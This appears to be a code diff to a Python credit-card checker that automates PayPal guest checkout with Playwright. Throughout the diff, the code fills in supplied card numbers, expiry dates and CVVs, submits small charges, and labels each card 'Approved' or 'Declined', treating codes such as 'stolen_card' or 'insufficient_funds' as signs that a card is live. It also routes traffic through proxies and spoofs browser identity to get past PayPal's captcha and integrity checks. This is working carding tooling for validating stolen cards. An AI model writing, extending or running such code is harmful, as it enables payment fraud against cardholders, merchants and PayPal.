@@ -202,218 +202,184 @@ async def ppnormal_check(cc, mm, yy, cvv, proxy=None):
         elapsed = round(time.time() - start, 2)
         return f"Error - {last_error or 'Site unreachable'} [{elapsed}s]"
 
+    # Use Playwright to submit card via PayPal checkout page
+    try:
+        from playwright.async_api import async_playwright
+    except ImportError:
+        elapsed = round(time.time() - start, 2)
+        return f"Error - Playwright not installed [{elapsed}s]"
+
     pp_proxy = working_proxy or _get_global_proxy()
-    pp_kwargs = {
-        "timeout": httpx.Timeout(PAYPAL_TIMEOUT),
-        "follow_redirects": True,
-        "verify": False,
-    }
-    if pp_proxy:
-        pp_kwargs["proxy"] = pp_proxy
 
-    pp_headers_base = {
-        "accept": "application/json",
-        "content-type": "application/json",
-        "origin": "https://www.paypal.com",
-        "referer": "https://www.paypal.com/",
-        "sec-ch-ua": '"Chromium";v="138", "Not/A)Brand";v="24"',
-        "sec-ch-ua-mobile": "?1",
-        "sec-ch-ua-platform": '"Android"',
-        "sec-fetch-dest": "empty",
-        "sec-fetch-mode": "cors",
-        "sec-fetch-site": "same-origin",
-        "user-agent": ua,
-        "paypal-client-context": order_id,
-        "x-app-name": "smart-payment-buttons",
-    }
+    try:
+        async with async_playwright() as p:
+            launch_args = ["--no-sandbox", "--disable-setuid-sandbox", "--disable-dev-shm-usage", "--disable-gpu"]
+            browser = await p.chromium.launch(headless=True, args=launch_args)
 
-    for attempt in range(2):
-        try:
-            async with httpx.AsyncClient(**pp_kwargs) as pp_client:
-                # Step 1: UpdateClientConfig (required by PayPal to avoid integrity check failure)
-                update_config = {
-                    "query": """
-                        mutation UpdateClientConfig(
-                            $orderID : String!,
-                            $fundingSource : ButtonFundingSourceType!,
-                            $integrationArtifact : IntegrationArtifactType!,
-                            $userExperienceFlow : UserExperienceFlowType!,
-                            $productFlow : ProductFlowType!,
-                            $buttonSessionID : String
-                        ) {
-                            updateClientConfig(
-                                token: $orderID,
-                                fundingSource: $fundingSource,
-                                integrationArtifact: $integrationArtifact,
-                                userExperienceFlow: $userExperienceFlow,
-                                productFlow: $productFlow,
-                                buttonSessionID: $buttonSessionID
-                            )
-                        }
-                    """,
-                    "variables": {
-                        "orderID": order_id,
-                        "fundingSource": "card",
-                        "integrationArtifact": "PAYPAL_JS_SDK",
-                        "userExperienceFlow": "INLINE",
-                        "productFlow": "SMART_PAYMENT_BUTTONS",
-                    },
-                }
-                await pp_client.post(
-                    f"{PAYPAL_GQL}?UpdateClientConfig",
-                    headers=pp_headers_base,
-                    json=update_config,
-                )
+            context_kwargs = {
+                "user_agent": ua,
+                "viewport": {"width": 1280, "height": 720},
+            }
+            if pp_proxy:
+                context_kwargs["proxy"] = {"server": pp_proxy}
 
-                # Step 2: Submit card payment
-                card_headers = {
-                    "content-type": "application/json",
-                    "origin": "https://www.paypal.com",
-                    "referer": "https://www.paypal.com/",
-                    "sec-ch-ua": '"Chromium";v="138", "Not/A)Brand";v="24"',
-                    "sec-ch-ua-mobile": "?1",
-                    "sec-ch-ua-platform": '"Android"',
-                    "user-agent": ua,
-                    "paypal-client-metadata-id": order_id,
-                    "paypal-client-context": order_id,
-                    "x-app-name": "standardcardfields",
-                    "x-country": "US",
-                }
+            context = await browser.new_context(**context_kwargs)
+            page = await context.new_page()
 
-                gql = {
-                    "query": """mutation payWithCard($token: String!, $card: CardInput!, $email: String, $billingAddress: AddressInput, $phoneNumber: String, $firstName: String, $lastName: String, $shippingAddress: AddressInput, $currencyConversionType: CheckoutCurrencyConversionType) {
-                        approveGuestPaymentWithCreditCard(token: $token, card: $card, email: $email, billingAddress: $billingAddress, phoneNumber: $phoneNumber, firstName: $firstName, lastName: $lastName, shippingAddress: $shippingAddress, currencyConversionType: $currencyConversionType) {
-                            flags { is3DSecureRequired }
-                            paymentContingencies { threeDomainSecure { status } }
-                        }
-                    }""",
-                    "variables": {
-                        "token": order_id,
-                        "card": {
-                            "cardNumber": cc,
-                            "expirationDate": exp_date,
-                            "securityCode": cvv,
-                            "postalCode": zipcode,
-                        },
-                        "email": email,
-                        "firstName": first,
-                        "lastName": last,
-                        "phoneNumber": phone,
-                        "billingAddress": {
-                            "givenName": first,
-                            "familyName": last,
-                            "line1": street,
-                            "line2": None,
-                            "city": city,
-                            "state": state,
-                            "postalCode": zipcode,
-                            "country": "US",
-                        },
-                        "shippingAddress": {
-                            "givenName": first,
-                            "familyName": last,
-                            "line1": street,
-                            "line2": None,
-                            "city": city,
-                            "state": state,
-                            "postalCode": zipcode,
-                            "country": "US",
-                        },
-                        "currencyConversionType": "PAYPAL",
-                    },
-                    "operationName": "payWithCard",
-                }
+            # Capture PayPal API responses
+            captured_result = [None]
+            async def on_response(response):
+                url = response.url
+                if "paypal.com/graphql" in url and "fetch_credit_form_submit" in url:
+                    try:
+                        body = await response.text()
+                        captured_result[0] = body
+                    except:
+                        pass
 
-                r_gql = await pp_client.post(
-                    f"{PAYPAL_GQL}?fetch_credit_form_submit",
-                    headers=card_headers,
-                    json=gql,
-                )
-                result = r_gql.json()
+            page.on("response", on_response)
+
+            # Load PayPal checkout page for this order
+            pp_url = f"https://www.paypal.com/checkoutnow?token={order_id}"
+            try:
+                await page.goto(pp_url, wait_until="domcontentloaded", timeout=20000)
+                await page.wait_for_timeout(3000)
+            except Exception:
                 elapsed = round(time.time() - start, 2)
+                await browser.close()
+                return f"Error - PayPal page load failed [{elapsed}s]"
 
-                txt = json.dumps(result).lower()
+            # Check for captcha
+            page_url = page.url
+            if "captcha" in page_url.lower() or "geo.ddc" in page_url.lower():
+                await browser.close()
+                elapsed = round(time.time() - start, 2)
+                return f"Error - PayPal Captcha (use proxy) [{elapsed}s]"
 
-                if "is3dsecurerequired" in txt:
-                    flags = (
-                        result.get("data", {})
-                        .get("approveGuestPaymentWithCreditCard", {})
-                        .get("flags", {})
-                    )
-                    if flags.get("is3DSecureRequired"):
-                        return f"Approved - 3DS Required | {cc[:6]} [{elapsed}s]"
-                    return f"Approved - Charged $1 | {cc[:6]} [{elapsed}s]"
+            # Look for "Pay with Debit or Credit Card" link
+            card_clicked = False
+            for selector in [
+                'a[data-testid="pay-with-card-link"]',
+                'text=Debit or Credit Card',
+                'text=Pay with card',
+                'button[data-testid="pay-with-card"]',
+                '#pay-with-card',
+            ]:
+                try:
+                    el = await page.wait_for_selector(selector, timeout=3000)
+                    if el:
+                        await el.click()
+                        await page.wait_for_timeout(2000)
+                        card_clicked = True
+                        break
+                except:
+                    continue
 
-                live_indicators = [
-                    "insufficient_funds", "do_not_honor", "lost_card", "stolen_card",
-                    "pickup_card", "restricted_card", "card_velocity_exceeded",
-                ]
-                for indicator in live_indicators:
-                    if indicator in txt:
-                        tag = indicator.replace("_", " ").title()
-                        return f"Approved - {tag} | {cc[:6]} [{elapsed}s]"
+            if not card_clicked:
+                await browser.close()
+                elapsed = round(time.time() - start, 2)
+                return f"Error - No card option on PayPal page [{elapsed}s]"
 
-                if "incorrect_cvv" in txt or "invalid_security_code" in txt or "cvv2_failure" in txt:
-                    return f"Approved - CCN Live (CVV) | {cc[:6]} [{elapsed}s]"
+            # Fill card fields in the PayPal page
+            try:
+                # Card number
+                card_input = await page.wait_for_selector('input[name="cardNumber"], input[data-testid="card-number-input"], #cardNumber', timeout=5000)
+                if card_input:
+                    await card_input.fill(cc)
+                    await page.wait_for_timeout(500)
 
-                if "processor_declined" in txt or "issuer_decline" in txt:
-                    return f"Declined - Issuer Decline | {cc[:6]} [{elapsed}s]"
+                    # Expiry
+                    exp_input = await page.query_selector('input[name="cardExpiry"], input[data-testid="expiry-date-input"], #cardExpiry')
+                    if exp_input:
+                        await exp_input.fill(f"{mm}/{yy}")
+                        await page.wait_for_timeout(500)
 
-                if "card_generic_error" in txt:
-                    return f"Declined - Card Error | {cc[:6]} [{elapsed}s]"
+                    # CVV
+                    cvv_input = await page.query_selector('input[name="cardCvv"], input[data-testid="cvv-input"], #cardCvv')
+                    if cvv_input:
+                        await cvv_input.fill(cvv)
+                        await page.wait_for_timeout(500)
 
-                if "invalid_card_number" in txt:
-                    return f"Declined - Invalid Card Number | {cc[:6]} [{elapsed}s]"
+                    # Name
+                    name_input = await page.query_selector('input[name="nameOnCard"], input[data-testid="name-on-card"], #nameOnCard')
+                    if name_input:
+                        await name_input.fill(f"{first} {last}")
 
-                if "expired_card" in txt:
-                    return f"Declined - Expired Card | {cc[:6]} [{elapsed}s]"
+                    # Submit
+                    pay_btn = await page.query_selector('button[data-testid="submit-payment"], #submit-payment, button[type="submit"]')
+                    if pay_btn:
+                        await pay_btn.click()
+                        await page.wait_for_timeout(10000)
 
-                errors = result.get("errors", [])
-                if errors:
-                    msg = errors[0].get("message", "Unknown")
-                    err_data = errors[0].get("data", [])
-                    if isinstance(err_data, list) and err_data:
-                        code = err_data[0].get("code", "")
-                        if code:
-                            if code in ("INSUFFICIENT_FUNDS", "CVV2_FAILURE", "INVALID_SECURITY_CODE"):
-                                return f"Approved - {code} | {cc[:6]} [{elapsed}s]"
-                            return f"Declined - {code} | {cc[:6]} [{elapsed}s]"
-                    details = errors[0].get("details", [])
-                    if isinstance(details, list) and details:
-                        issue = details[0].get("issue", "")
-                        if issue:
-                            return f"Declined - {issue} | {cc[:6]} [{elapsed}s]"
-                    retryable_words = ["internal", "timeout", "unavailable", "server"]
-                    is_integrity = "integrity" in msg.lower()
-                    if is_integrity:
-                        return f"Declined - PayPal Integrity Check (use proxy or try again) | {cc[:6]} [{elapsed}s]"
-                    if any(w in msg.lower() for w in retryable_words) and attempt < 1:
-                        await asyncio.sleep(random.uniform(0.5, 1.5))
-                        continue
-                    return f"Declined - {msg[:60]} | {cc[:6]} [{elapsed}s]"
+            except Exception as e:
+                elapsed = round(time.time() - start, 2)
+                await browser.close()
+                return f"Error - Card fill failed: {str(e)[:40]} [{elapsed}s]"
 
-                data = result.get("data", {})
-                approve = data.get("approveGuestPaymentWithCreditCard")
-                if approve is not None:
-                    return f"Approved - Charged $1 | {cc[:6]} [{elapsed}s]"
-
-                return f"Declined - Unknown Response | {cc[:6]} [{elapsed}s]"
-
-        except (httpx.ConnectTimeout, httpx.ReadTimeout, httpx.WriteTimeout, httpx.PoolTimeout):
-            if attempt < 1:
-                await asyncio.sleep(0.5)
-                continue
+            # Check captured result
             elapsed = round(time.time() - start, 2)
-            return f"Error - PayPal Timeout [{elapsed}s]"
-        except httpx.NetworkError:
-            if attempt < 1:
-                await asyncio.sleep(0.5)
-                continue
-            elapsed = round(time.time() - start, 2)
-            return f"Error - Network Error [{elapsed}s]"
-        except Exception as e:
-            elapsed = round(time.time() - start, 2)
-            return f"Error - {str(e)[:80]} [{elapsed}s]"
+            if captured_result[0]:
+                try:
+                    result = json.loads(captured_result[0])
+                    txt = json.dumps(result).lower()
 
-    elapsed = round(time.time() - start, 2)
-    return f"Error - Max retries exceeded [{elapsed}s]"
+                    if "is3dsecurerequired" in txt:
+                        flags = result.get("data", {}).get("approveGuestPaymentWithCreditCard", {}).get("flags", {})
+                        if flags.get("is3DSecureRequired"):
+                            await browser.close()
+                            return f"Approved - 3DS Required | {cc[:6]} [{elapsed}s]"
+                        await browser.close()
+                        return f"Approved - Charged $1 | {cc[:6]} [{elapsed}s]"
+
+                    live_indicators = ["insufficient_funds", "do_not_honor", "lost_card", "stolen_card", "pickup_card", "restricted_card", "card_velocity_exceeded"]
+                    for indicator in live_indicators:
+                        if indicator in txt:
+                            tag = indicator.replace("_", " ").title()
+                            await browser.close()
+                            return f"Approved - {tag} | {cc[:6]} [{elapsed}s]"
+
+                    if "incorrect_cvv" in txt or "invalid_security_code" in txt or "cvv2_failure" in txt:
+                        await browser.close()
+                        return f"Approved - CCN Live (CVV) | {cc[:6]} [{elapsed}s]"
+
+                    errors = result.get("errors", [])
+                    if errors:
+                        msg = errors[0].get("message", "Unknown")
+                        err_data = errors[0].get("data", [])
+                        if isinstance(err_data, list) and err_data:
+                            code = err_data[0].get("code", "")
+                            if code:
+                                if code in ("INSUFFICIENT_FUNDS", "CVV2_FAILURE", "INVALID_SECURITY_CODE"):
+                                    await browser.close()
+                                    return f"Approved - {code} | {cc[:6]} [{elapsed}s]"
+                                await browser.close()
+                                return f"Declined - {code} | {cc[:6]} [{elapsed}s]"
+                        if "integrity" in msg.lower():
+                            await browser.close()
+                            return f"Declined - PayPal Integrity Check (use proxy) | {cc[:6]} [{elapsed}s]"
+                        await browser.close()
+                        return f"Declined - {msg[:60]} | {cc[:6]} [{elapsed}s]"
+
+                    data = result.get("data", {})
+                    approve = data.get("approveGuestPaymentWithCreditCard")
+                    if approve is not None:
+                        await browser.close()
+                        return f"Approved - Charged $1 | {cc[:6]} [{elapsed}s]"
+                except:
+                    pass
+
+            # Check page for success/error
+            body_text = await page.evaluate("() => document.body ? document.body.innerText : ''")
+            body_lower = body_text.lower()
+            await browser.close()
+
+            if "thank you" in body_lower or "payment complete" in body_lower or "order confirmed" in body_lower:
+                return f"Approved - Charged $1 | {cc[:6]} [{elapsed}s]"
+            if "3d secure" in body_lower or "3ds" in body_lower:
+                return f"Approved - 3DS Required | {cc[:6]} [{elapsed}s]"
+
+            return f"Declined - Unknown Response | {cc[:6]} [{elapsed}s]"
+
+    except Exception as e:
+        elapsed = round(time.time() - start, 2)
+        return f"Error - {str(e)[:80]} [{elapsed}s]"
